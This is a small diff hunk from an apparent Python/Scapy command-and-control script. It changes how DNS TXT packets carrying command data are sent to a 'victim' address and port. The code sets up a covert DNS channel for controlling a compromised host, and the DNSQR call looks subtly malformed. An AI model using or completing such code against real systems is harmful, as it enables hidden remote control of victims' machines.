@@ -39,7 +39,7 @@ def send_command(ip_adr,vic_sport,get_qname):
     #pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=data_recieved,an=DNSRR(rdata=combined)))
     # pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)
     # send_response(pkt_no_dns,get_qname=get_qname,data=combined)
-    send(IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=get_qname,an=DNSRR(rdata=data))))
+    send(IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=get_qname,an=DNSRR(rdata=combined))))
     #pkt_send(pkt_no_data,combined,0)
 
     commands_que = ""
